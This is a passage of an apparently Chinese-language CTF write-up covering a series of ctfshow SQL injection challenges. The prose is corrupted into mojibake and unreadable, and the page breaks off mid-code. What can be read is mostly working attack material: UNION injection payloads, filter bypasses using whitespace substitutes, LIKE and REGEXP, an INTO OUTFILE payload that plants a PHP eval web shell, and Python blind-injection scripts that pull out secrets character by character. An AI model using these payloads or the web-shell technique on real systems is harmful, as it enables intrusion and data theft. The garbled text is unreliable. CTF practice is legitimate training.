ä¸ºè½¬æ¢çš„å­—æ¯å…¨æ˜¯å¤§å†™ï¼Œæ‰€ä»¥æˆ‘ä»¬æ›¿æ¢çš„æ˜¯å°å†™ï¼Œé‚£ä¹ˆå°±ä¸ä¼šå‡ºç°å½±å“ã€‚</p><p><strong>æ›¿æ¢å›å»çš„pyè„šæœ¬</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">nb=<span class="string">&#x27;ctfshow&#123;nbfnbcnbgnbdnbfnbfnbgnbcnbfnbhnbfFnbgnbgnbgBnbcnbenbcnbanbcnbbnbfnbcnbfnbfnbfnbcnbcnbenbfnbfnbbDnbfnbanbfnbcnbcnbanbcnbhnbbDnbcnbdnbcnbbnbfnbanbcnbanbbDnbfnbbnbcnbgnbcnbcnbcnbcnbbDnbfnbdnbfnbbnbfnbcnbfnbbnbcnbdnbcnbfnbcnbjnbcnbanbcnbdnbcnbbnbfnbfnbcnbjnbgD&#125;&#x27;</span></span><br><span class="line"><span class="comment">#nbè¡¨ç¤ºnumber</span></span><br><span class="line">nb=nb.replace(<span class="string">&#x27;nba&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">nb=nb.replace(<span class="string">&#x27;nbb&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">nb=nb.replace(<span class="string">&#x27;nbc&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">nb=nb.replace(<span class="string">&#x27;nbd&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">nb=nb.replace(<span class="string">&#x27;nbe&#x27;</span>,<span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">nb=nb.replace(<span class="string">&#x27;nbf&#x27;</span>,<span class="string">&#x27;6&#x27;</span>)</span><br><span class="line">nb=nb.replace(<span class="string">&#x27;nbg&#x27;</span>,<span class="string">&#x27;7&#x27;</span>)</span><br><span class="line">nb=nb.replace(<span class="string">&#x27;nbh&#x27;</span>,<span class="string">&#x27;8&#x27;</span>)</span><br><span class="line">nb=nb.replace(<span class="string">&#x27;nbi&#x27;</span>,<span class="string">&#x27;9&#x27;</span>)</span><br><span class="line">nb=nb.replace(<span class="string">&#x27;nbj&#x27;</span>,<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(nb)</span><br></pre></td></tr></table></figure><p><img src="../images/image-20221226232256106.png" alt="image-20221226232256106"></p><p>è¿™é‡Œå»è¾“å…¥aæ˜¯ä¸ºäº†æŠŠflagåç»™æ›¿æ¢æ‰ã€‚</p><p>è¾“å…¥payloadï¼Œæ‹¿åˆ°è½¬æ¢åçš„flagï¼Œæ”¾åˆ°è„šæœ¬é‡Œ</p><p><img src="../images/image-20221226232824965.png" alt="image-20221226232824965"></p><p>å¾—åˆ°è¾“å‡ºç»“æœåï¼Œè¿›è¡Œ16è¿›åˆ¶è½¬æ¢ã€‚</p><p><img src="../images/image-20221226233028450.png" alt="image-20221226233028450"></p><h2 id="web175"><a href="#web175" class="headerlink" title="web175"></a>web175</h2><p>æºç </p><p><img src="../images/image-20221226234423628.png" alt="image-20221226234423628"></p><p>è¿™é‡Œå»æŸ¥äº†ä¸€ä¸‹asciiè¡¨ï¼Œå‘ç°æ˜¯å…¨éƒ¨éƒ½ç»™è¿‡æ»¤æ‰äº†ï¼Œå¤ªè‡´å‘½äº†ã€‚æ‰€ä»¥çœ‹äº†ç¾¤ä¸»çš„è§†é¢‘ï¼Œå­¦åˆ°äº†ä¸€ç§æ–¹æ³•</p><p>å°±æ˜¯åˆ©ç”¨è¿™ä¸ªä¸œè¥¿</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,&quot;&lt;?php eval($_POST[1]);?&gt;&quot; into outfile&#x27;/var/www/html/1.php</span><br></pre></td></tr></table></figure><p>ç„¶åå°±å»è¿æ¥èšå‰‘ï¼Œè¿æ¥èšå‰‘å®Œåå°±å»è¿æ¥æ•°æ®åº“å°±å¥½äº†ã€‚</p><p>ï¼ˆä½†æ˜¯æˆ‘è¿æ¥æ•°æ®åº“å¤±è´¥ï¼Œä¸çŸ¥é“æ˜¯å•¥åŸå› ï¼‰</p><h2 id="web176"><a href="#web176" class="headerlink" title="web176"></a>web176</h2><p>æºç </p><p><img src="../images/image-20221227153245178.png" alt="image-20221227153245178"></p><p>å°±æ˜¯å¢åŠ äº†è¿‡æ»¤ï¼Œä½†æ˜¯è¿™é‡Œä¹Ÿæ²¡ç»™è¿‡æ»¤äº†å•¥ï¼Œæ‰€ä»¥å¯ä»¥æ‹¿ç®€å•çš„ä»£ç è¯•è¯•ï¼Œçœ‹èƒ½ä¸èƒ½æ‰“é€šã€‚</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; or id=&#x27;26     -1&#x27; or username=&#x27;flag</span><br></pre></td></tr></table></figure><p><img src="../images/image-20221227153414750.png" alt="image-20221227153414750"></p><p>æˆåŠŸæ‹¿åˆ°flagã€‚</p><h2 id="web177"><a href="#web177" class="headerlink" title="web177"></a>web177</h2><p>æºç </p><p><img src="../images/image-20221227154121948.png" alt="image-20221227154121948"></p><p>è¿™é“é¢˜ç®€å•è¿›è¡Œäº†æµ‹è¯•ï¼Œå‘ç°çš„æ˜¯å¯¹ç©ºæ ¼è¿›è¡Œäº†è¿‡æ»¤ã€‚</p><p><strong>ç©ºæ ¼è¢«è¿‡æ»¤çš„æ›¿æ¢æ–¹æ³•</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">é¦–å…ˆæˆ‘ä»¬ç©ºæ ¼è¢«è¿‡æ»¤ï¼Œè¿™ä¸ªç»•è¿‡æ–¹æ³•æœ‰å¾ˆå¤š</span><br><span class="line">ä½¿ç”¨æ³¨é‡Šç»•è¿‡ï¼Œ/**/ï¼Œä½†æ˜¯å› ä¸ºâ€™/â€˜è¢«è¿‡æ»¤ï¼Œå¯¼è‡´æ­¤æ–¹æ³•æ— æ³•ä½¿ç”¨</span><br><span class="line">ä½¿ç”¨æ‹¬å·ç»•è¿‡ï¼Œæ‹¬å·å¯ä»¥ç”¨æ¥åŒ…å›´å­æŸ¥è¯¢ï¼Œä»»ä½•è®¡ç®—ç»“æœçš„è¯­å¥éƒ½å¯ä»¥ä½¿ç”¨ï¼ˆï¼‰åŒ…å›´ï¼Œå¹¶ä¸”ä¸¤ç«¯å¯ä»¥æ²¡æœ‰å¤šä½™çš„ç©ºæ ¼</span><br><span class="line">ä½¿ç”¨ç¬¦å·æ›¿ä»£ç©ºæ ¼ %20 %09 %0d %0b %0c %0d %a0 %0aï¼Œè¿™é‡Œæˆ‘é€‰æ‹©äº†%0aè¿›è¡Œç»•è¿‡</span><br></pre></td></tr></table></figure><p><img src="../images/image-20221227154738181.png" alt="image-20221227154738181"></p><p>é€šè¿‡æµ‹è¯•ï¼Œç¡®å®æ˜¯ç©ºæ ¼è¢«è¿‡æ»¤äº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥é€‰æ‹©2ä¸ºæ³¨é‡Šç‚¹ã€‚</p><p><img src="../images/image-20221227154904901.png" alt="image-20221227154904901"></p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;/**/union/**/select/**/&#x27;1&#x27;,(select/**/password/**/from/**/ctfshow_user/**/where/**/username=&#x27;flag&#x27;),&#x27;3&#x27;;%23</span><br></pre></td></tr></table></figure><p>ç›´æ¥ç”¨#ä¸è¡Œï¼Œå¾—è¿›è¡Œurlç¼–ç ã€‚</p><h2 id="web178"><a href="#web178" class="headerlink" title="web178"></a>web178</h2><p>æºç </p><p><img src="../images/image-20221227155020058.png" alt="image-20221227155020058"></p><p>è¿™é“é¢˜æ˜¯æŠŠ/**ç»™è¿‡æ»¤æ‰äº†ï¼Œç„¶åæ¢æˆ%0bå°±è¡Œã€‚</p><p><img src="../images/image-20221227155457926.png" alt="image-20221227155457926"></p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;%0bunion%0bselect%0b&#x27;1&#x27;,(select%0bpassword%0bfrom%0bctfshow_user%0bwhere%0busername=&#x27;flag&#x27;),&#x27;3&#x27;;%23</span><br></pre></td></tr></table></figure><h2 id="web179"><a href="#web179" class="headerlink" title="web179"></a>web179</h2><p>æºç </p><p><img src="../images/image-20221227155714933.png" alt="image-20221227155714933"></p><p>è¿™é“é¢˜è¿›è¡Œäº†æµ‹è¯•ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/**/  %0a  %0b éƒ½è¿‡æ»¤æ‰äº†</span><br></pre></td></tr></table></figure><p><img src="../images/image-20221227155823003.png" alt="image-20221227155823003"></p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;%0cunion%0cselect%0c&#x27;1&#x27;,(select%0cpassword%0cfrom%0cctfshow_user%0cwhere%0cusername=&#x27;flag&#x27;),&#x27;3&#x27;;%23</span><br></pre></td></tr></table></figure><h2 id="web180"><a href="#web180" class="headerlink" title="web180"></a>web180</h2><p>æºç </p><p><img src="../images/image-20221227160433511.png" alt="image-20221227160433511"></p><p>ç”¨179çš„payloadè¿˜èƒ½ç”¨ï¼Œä½†æ˜¯å¾—æŠŠåé¢çš„ä¸œè¥¿å»æ‰ï¼Œä¹Ÿè¯¥æ˜¯è¿‡æ»¤æ‰äº†;æˆ–è€…æ˜¯%23</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;%0cunion%0cselect%0c&#x27;1&#x27;,(select%0cpassword%0cfrom%0cctfshow_user%0cwhere%0cusername=&#x27;flag&#x27;),&#x27;3</span><br></pre></td></tr></table></figure><h2 id="web181"><a href="#web181" class="headerlink" title="web181"></a>web181</h2><p>æºç </p><p><img src="../images/image-20221227160739728.png" alt="image-20221227160739728"></p><p>ç»™äº†è¿‡æ»¤é¡¹ã€‚</p><p>andçš„ä¼˜å…ˆçº§é«˜äºorï¼Œéœ€è¦åŒæ—¶æ»¡è¶³ä¸¤è¾¹çš„æ¡ä»¶æ‰ä¼šè¿”å›trueï¼Œé‚£ä¹ˆåé¢å¯ä»¥æ¥ä¸€ä¸ªorï¼Œorçš„ä¸¤è¾¹æœ‰ä¸€ä¸ªä¸ºtrueï¼Œæ—¢å¯ä»¥æ»¡è¶³andã€‚å³ï¼š1 and 0 or 1</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;||username=&#x27;flag</span><br></pre></td></tr></table></figure><p><img src="../images/image-20221227161951410.png" alt="image-20221227161951410"></p><p>è¿™é“é¢˜ä¹Ÿèƒ½ç”¨%0cæ¥åšï¼Œé‚£ä¹ˆå°±æ˜¯é¢˜ç›®ç»™æ¼äº†ã€‚</p><h2 id="web182"><a href="#web182" class="headerlink" title="web182"></a>web182</h2><p>æºç </p><p><img src="../images/image-20221227162638001.png" alt="image-20221227162638001"></p><p>å¤šè¿‡æ»¤äº†ä¸ªflag</p><p>%  â€”-&gt;ç›¸å½“äº*ï¼Œä»»æ„åŒ¹é…</p><p>_   â€”â€”-&gt;ç›¸å½“äºï¼Ÿï¼Œåªèƒ½åŒ¹é…ä¸€ä¸ªå­—ç¬¦</p><p><strong>payload</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;||(username)like&#x27;%fla%</span><br></pre></td></tr></table></figure><p><img src="../images/image-20221227162805178.png" alt="image-20221227162805178"></p><h2 id="web183"><a href="#web183" class="headerlink" title="web183"></a>web183</h2><p>æºç </p><p><img src="../images/image-20221227174007597.png" alt="image-20221227174007597"></p><p><a href="https://blog.csdn.net/m0_48780534/article/details/126155600">https://blog.csdn.net/m0_48780534/article/details/126155600</a>   æ‘˜è‡ªè¿™ç¯‡åšå®¢</p><p>è§£ç­”ï¼šwafåˆå¢åŠ äº†ä¸€äº›ï¼Œé¢˜ç›®ä¹Ÿæœ‰å˜åŒ–äº†ã€‚æŸ¥è¯¢åˆ°çš„ç»“æœä¼šè¿”å›åˆ°ä¸‹é¢ç¬¬ä¸‰ä¸ªç°å—é‚£é‡Œã€‚</p><p>selectä¸èƒ½ç”¨ï¼Œå°±åªèƒ½é€‰æ‹©å¸ƒå°”ç›²æ³¨æˆ–è€…æ—¶é—´ç›²æ³¨äº†ã€‚</p><p>è¿™é¢˜çš„è§£æ³•æ˜¯åœ¨å·²çŸ¥è¡¨åçš„æƒ…å†µä¸‹å®ç°çš„ï¼Œå†ç»“åˆæ¨¡ç³ŠåŒ¹é…likeæˆ–è€…æ­£åˆ™åŒ¹é…regexpã€‚<br>å†™è„šæœ¬å‰å…ˆæµ‹è¯•ä¸€ä¸‹è¯­å¥æ˜¯å¦èƒ½æ­£å¸¸æ‰§è¡Œï¼Œå¯ä»¥çš„è¯ï¼Œå†å†™åˆ°è„šæœ¬é‡Œã€‚</p><p>å› ä¸ºæ¯æ¬¡æŸ¥è¯¢è®°å½•æ€»æ•°éƒ½æ˜¯1æ¡ï¼Œå°±æ˜¯æˆ‘ä»¬è¦æ‰¾çš„flagï¼Œæ‰€ä»¥é¡µé¢å›ºå®šä¼šå‡ºç°$user_count = 1;ï¼Œå¯ä»¥ç”¨å¸ƒå°”ç›²æ³¨ã€‚</p><p>é¢˜ç›®è¿™é‡Œå¯ä»¥è¡Œå¾—é€š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tableName=`ctfshow_user`where`pass`like&#x27;ctfshow&#123;%&#x27;</span><br></pre></td></tr></table></figure><p>wpè„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url=<span class="string">&quot;http://5b285b83-8642-4556-b1cc-ca435d196f99.challenge.ctf.show/select-waf.php&quot;</span></span><br><span class="line"></span><br><span class="line">flagstr=<span class="string">&quot;ctfshow&#123;qeryuipadgjklzxvbnm0123456789-&#125;_&quot;</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">34</span>):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> flagstr:</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&quot;tableName&quot;</span>:<span class="string">&quot;`ctfshow_user`where`pass`regexp(\&quot;ctfshow&#123;&#125;\&quot;)&quot;</span>.<span class="built_in">format</span>(flag+x)</span><br><span class="line">            <span class="comment">#&quot;tableName&quot;:&quot;`ctfshow_user`where`pass`like\&#x27;ctfshow&#123;&#125;%\&#x27;&quot;.format(flag+x)</span></span><br><span class="line">        &#125;</span><br><span class="line">        response=requests.post(url,data=data)</span><br><span class="line">        <span class="comment">#æœ‰å¹¶å‘æ•°é‡é™åˆ¶çš„é¢˜ç›®ï¼Œå°±ç¡ä¸€æ®µæ—¶é—´</span></span><br><span class="line">        time.sleep(<span class="number">0.3</span>)</span><br><span class="line">        <span class="keyword">if</span> response.text.find(<span class="string">&quot;$user_count = 1;&quot;</span>)&gt;<span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;++++++++++++++++ &#123;&#125; is right&quot;</span>.<span class="built_in">format</span>(x))</span><br><span class="line">            flag+=x</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;ctfshow&quot;</span>+flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>regexp</code>è¿™ä¸ªæ˜¯æ­£åˆ™åŒ¹é…çš„æ„æ€ã€‚</p><p><img src="../images/image-20221227182656859.png" alt="image-20221227182656859"></p><p>åˆ©ç”¨è„šæœ¬å°±å¯ä»¥è·‘å®Œäº†ï¼Œå°±æ˜¯è·‘çš„ä¼šæœ‰ç‚¹ä¹…ã€‚</p><h2 id="web184"><a href="#web184" class="headerlink" title="web184"></a>web184</h2><p>æºç </p><p><img src="../images/image-20221227183934675.png" alt="image-20221227183934675"></p><p>ç€é‡Œæ˜¯æŠŠwhereå’Œå•åŒå¼•å·éƒ½ç»™è¿‡æ»¤æ‰äº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¾—å»åˆ©ç”¨16è¿›åˆ¶ç»™ç»•è¿‡ï¼Œwhereè¢«è¿‡æ»¤çš„è¯å¯ä»¥ä½¿ç”¨havingè¿›è¡Œç»•è¿‡ï¼Œä½†æ˜¯havingæœ‰ä½¿ç”¨æ¡ä»¶.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ä¸€ä¸ªHAVINGå­å¥å¿…é¡»ä½äºGROUP BYå­å¥ä¹‹åï¼Œå¹¶ä½äºORDER BYå­å¥ä¹‹å‰ã€‚</span><br></pre></td></tr></table></figure><p>wpè„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url=<span class="string">&quot;http://77ccea0a-ea21-463d-bd36-c3517890ddcd.challenge.ctf.show/select-waf.php&quot;</span></span><br><span class="line"></span><br><span class="line">flagstr=<span class="string">&quot;ctfshow&#123;qeryuipadgjklzxvbnm0123456789-&#125;_&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">str2hex</span>(<span class="params"><span class="built_in">str</span></span>):</span><br><span class="line">    a= <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">        a += <span class="built_in">hex</span>(<span class="built_in">ord</span>(x))</span><br><span class="line">    <span class="keyword">return</span> a.replace(<span class="string">&quot;0x&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    flag=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">48</span>):</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> flagstr:</span><br><span class="line">            data=&#123;</span><br><span class="line">                <span class="string">&quot;tableName&quot;</span>:<span class="string">&quot;ctfshow_user group by pass having pass regexp(0x63746673686f77&#123;&#125;)&quot;</span>.<span class="built_in">format</span>(str2hex(flag+x))</span><br><span class="line">                <span class="comment">#&quot;tableName&quot;:&quot;`ctfshow_user`where`pass`like\&#x27;ctfshow&#123;&#125;%\&#x27;&quot;.format(flag+x)</span></span><br><span class="line">            &#125;</span><br><span class="line">            response=requests.post(url,data=data)</span><br><span class="line">            <span class="comment">#æœ‰å¹¶å‘æ•°é‡é™åˆ¶çš„é¢˜ç›®ï¼Œå°±ç¡ä¸€æ®µæ—¶é—´</span></span><br><span class="line">            time.sleep(<span class="number">0.3</span>)</span><br><span class="line">            <span class="keyword">if</span> response.text.find(<span class="string">&quot;$user_count = 1;&quot;</span>)&gt;<span class="number">0</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;++++++++++++++++ &#123;&#125; is right&quot;</span>.<span class="built_in">format</span>(x))</span><br><span class="line">                flag+=x</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;ctfshow&quot;</span>+flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">      main()</span><br></pre></td></tr></table></figure><h2 id="web185"><a href="#web185" class="headerlink" title="web185"></a>web185</h2><p>æºç </p><p><img src="../images/image-20221229192109344.png" alt="image-20221229192109344"></p><p>è¿™é¢˜æ˜¯æŠŠ<strong>æ•°å­—  where å•åŒå¼•å·</strong> ç»™è¿‡æ»¤æ‰äº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¾—æƒ³åŠæ³•æ„é€ å­—ç¬¦äº†ã€‚</p><p><img src="../images/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NvbGl0dWRp,size_16,color_FFFFFF,t_70#pic_center.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>å°±æ˜¯åˆ©ç”¨è¿™ä¸ªä¸œè¥¿æ¥æ„é€ å­—ç¬¦ä¸²ï¼Œä½†æ˜¯æˆ‘ä»¬å¾—éœ€è¦ä¸€ä¸ªå‡½æ•°æ¥æŠŠè¿™äº›æ„é€ å‡ºæ¥çš„ä¸œè¥¿ç»™è¿æ¥èµ·æ¥ã€‚</p><p><img src="../images/1a58fc8b87484af9952dbcf4f65e90e1.png" alt="img"></p><p>æœ¬åœ°æµ‹è¯•äº†ä¸€ä¸‹ï¼Œå‘ç°ç¡®å®å¯ä»¥ã€‚</p><p><img src="../images/image-20221229214124144.png" alt="image-20221229214124144"></p><p>ä»¥ä¸‹è„šæœ¬æ‘˜è‡ªè¿™ç¯‡æ–‡ç«    <a href="https://blog.csdn.net/m0_48780534/article/details/126155600">https://blog.csdn.net/m0_48780534/article/details/126155600</a></p><p>wpè„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">formatString</span>(<span class="params"><span class="built_in">str</span></span>):</span><br><span class="line">    temp=<span class="string">&quot;concat(&quot;</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">str</span>:</span><br><span class="line">        tip=<span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> x <span class="keyword">in</span> string.digits:</span><br><span class="line">            tmp=<span class="built_in">int</span>(x)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tip=<span class="number">1</span></span><br><span class="line">            temp+=<span class="string">&quot;char(&quot;</span></span><br><span class="line">            tmp=<span class="built_in">ord</span>(x)</span><br><span class="line">        <span class="keyword">if</span> tmp == <span class="number">0</span>:</span><br><span class="line">            temp+=<span class="string">&quot;false&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            temp_d=<span class="string">&quot;(&quot;</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,tmp):</span><br><span class="line">                temp_d+=<span class="string">&quot;true+&quot;</span></span><br><span class="line">            temp_d=temp_d[:-<span class="number">1</span>]+<span class="string">&quot;)&quot;</span></span><br><span class="line">            <span class="keyword">if</span> tip==<span class="number">1</span>:</span><br><span class="line">                temp_d+=<span class="string">&quot;)&quot;</span></span><br><span class="line">            temp+=temp_d</span><br><span class="line">        temp+=<span class="string">&quot;,&quot;</span></span><br><span class="line">    temp=temp[:-<span class="number">1</span>]+<span class="string">&quot;)&quot;</span></span><br><span class="line">    <span class="keyword">return</span> temp</span><br><span class="line"></span><br><span class="line"><span class="comment">#print(formatString(&quot;0x63746673686f777b&quot;))</span></span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://d2f644f5-968d-4301-b037-267c7b183b0e.challenge.ctf.show/select-waf.php&quot;</span></span><br><span class="line"><span class="comment">#dicçš„é¡ºåºå¯ä»¥æ”¹ä¸€ä¸‹ï¼æˆ‘æ˜¯æ‡’å¾—æ”¹äº†ï¼æ”¹é¡ºåºå¯ä»¥æé«˜æ•ˆç‡ï¼ï¼ï¼</span></span><br><span class="line">dic=<span class="string">&quot;ctfshow&#123;qeryuipadgjklzxvbnm0123456789-&#125;_&quot;</span></span><br><span class="line">flag=<span class="string">&quot;ctfshow&#123;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">40</span>):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> dic:</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">&quot;tableName&quot;</span>:<span class="string">&quot;ctfshow_user group by pass having pass regexp(&#123;&#125;)&quot;</span>.<span class="built_in">format</span>(formatString(flag+x))</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">#print(data)</span></span><br><span class="line">        response=requests.post(url,data=data)</span><br><span class="line">        time.sleep(<span class="number">0.3</span>)</span><br><span class="line">        <span class="keyword">if</span> response.text.find(<span class="string">&quot;$user_count = 1;&quot;</span>)&gt;<span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[**] &#123;&#125; is right&quot;</span>.<span class="built_in">format</span>(x))</span><br><span class="line">            flag+=x</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment">#print(&quot;[--] &#123;&#125; is wrong&quot;.format(x))</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[flag]:&quot;</span>+flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ˜¯ç¾¤ä¸»å†™çš„è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span 